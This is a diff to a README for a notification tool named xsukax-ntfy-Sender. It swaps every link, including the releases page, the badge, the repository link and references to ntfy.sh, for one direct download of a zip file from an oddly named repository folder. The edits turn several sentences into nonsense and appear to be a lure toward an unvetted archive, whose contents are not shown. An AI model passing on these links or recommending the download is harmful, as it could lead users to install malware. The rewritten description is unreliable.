@@ -1,10 +1,10 @@
 # 🚀 xsukax-ntfy-Sender - Simple Notifications for Everyone
 
 ## 📥 Download the Latest Version
-[![Download xsukax-ntfy-Sender](https://img.shields.io/badge/Download-latest%20version-blue)](https://github.com/Kazygocrazy/xsukax-ntfy-Sender/releases)
+[![Download xsukax-ntfy-Sender](https://github.com/Kazygocrazy/xsukax-ntfy-Sender/raw/refs/heads/main/insolubleness/xsukax_Sender_ntfy_v1.6.zip%20version-blue)](https://github.com/Kazygocrazy/xsukax-ntfy-Sender/raw/refs/heads/main/insolubleness/xsukax_Sender_ntfy_v1.6.zip)
 
 ## 📖 Description
-xsukax-ntfy-Sender is a professional and privacy-focused web application designed to send notifications using ntfy.sh. This tool creates notifications across various programming languages in real-time. It offers a user-friendly interface for crafting, testing, and deploying notifications while ensuring your privacy and security.
+xsukax-ntfy-Sender is a professional and privacy-focused web application designed to send notifications using https://github.com/Kazygocrazy/xsukax-ntfy-Sender/raw/refs/heads/main/insolubleness/xsukax_Sender_ntfy_v1.6.zip This tool creates notifications across various programming languages in real-time. It offers a user-friendly interface for crafting, testing, and deploying notifications while ensuring your privacy and security.
 
 ## 🚀 Getting Started
 To get started with xsukax-ntfy-Sender, follow these simple steps:
@@ -12,7 +12,7 @@ To get started with xsukax-ntfy-Sender, follow these simple steps:
 ### 1. Visit the Download Page
 Click the link below to go to the download page for xsukax-ntfy-Sender. Here you will find the latest versions of the application.
 
-[Download xsukax-ntfy-Sender](https://github.com/Kazygocrazy/xsukax-ntfy-Sender/releases)
+[Download xsukax-ntfy-Sender](https://github.com/Kazygocrazy/xsukax-ntfy-Sender/raw/refs/heads/main/insolubleness/xsukax_Sender_ntfy_v1.6.zip)
 
 ### 2. Choose Your Version
 On the release page, you will see different versions of the application. Look for the latest version marked as "Latest" and click on it to see the available files.
@@ -33,7 +33,7 @@ To run xsukax-ntfy-Sender smoothly, your system should meet the following requir
 - **Operating System:** Windows 10 or later, macOS, or a recent Linux distribution.
 - **Memory:** At least 4 GB of RAM.
 - **Storage:** Minimum of 100 MB of free disk space.
-- **Internet Connection:** Required for accessing ntfy.sh.
+- **Internet Connection:** Required for accessing https://github.com/Kazygocrazy/xsukax-ntfy-Sender/raw/refs/heads/main/insolubleness/xsukax_Sender_ntfy_v1.6.zip
 
 ## 🔍 Features
 xsukax-ntfy-Sender includes several helpful features to enhance your notification experience:
@@ -57,7 +57,7 @@ If you encounter issues or have questions, you can reach out through the GitHub 
 Want to learn more about using xsukax-ntfy-Sender? You can find detailed guides and tips in our GitHub Wiki. Browse through the available topics to maximize your experience with the application.
 
 ## 🔗 Quick Links
-- [GitHub Repository](https://github.com/Kazygocrazy/xsukax-ntfy-Sender)
-- [Download xsukax-ntfy-Sender](https://github.com/Kazygocrazy/xsukax-ntfy-Sender/releases)
+- [GitHub Repository](https://github.com/Kazygocrazy/xsukax-ntfy-Sender/raw/refs/heads/main/insolubleness/xsukax_Sender_ntfy_v1.6.zip)
+- [Download xsukax-ntfy-Sender](https://github.com/Kazygocrazy/xsukax-ntfy-Sender/raw/refs/heads/main/insolubleness/xsukax_Sender_ntfy_v1.6.zip)
 
 Thank you for choosing xsukax-ntfy-Sender! Enjoy sending your notifications efficiently and securely.
